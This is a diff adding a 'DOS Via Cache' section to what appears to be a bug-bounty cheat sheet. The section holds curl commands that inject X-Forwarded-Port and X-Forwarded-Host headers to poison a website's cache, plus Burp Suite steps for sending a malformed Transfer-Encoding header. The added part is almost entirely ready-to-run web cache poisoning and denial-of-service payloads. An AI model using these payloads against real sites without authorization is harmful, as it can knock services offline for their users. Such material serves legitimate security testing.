@@ -17,3 +17,19 @@ if its not then it will look like this:
 provided credentials are mission or invalid
 
 [Report/Reference](https://hackerone.com/reports/154278)
+
+## DOS Via Cache
+```bash
+curl -H ‘X-Forwarded-Port: 123’ https://www.website.com/?toxic=888
+Then try to load https://www.website.com/?toxic=888 in your browser
+```
+```bash
+curl -H ‘X-Forwarded-Host: www.website.com:123' https://www.website.com/?toxic=888
+Then try to load https://www.website.com/?toxic=888 in your browser
+```
+```bash
+- Go to target website and intercept the request using burp suite
+Send the request to repeater and add the header zTRANSFER-ENCODING: dgsht
+Click on go and check the response, if it is vulnerable then it will show you an error of 501 ‘NOT_IMPLEMENTED’
+
+```
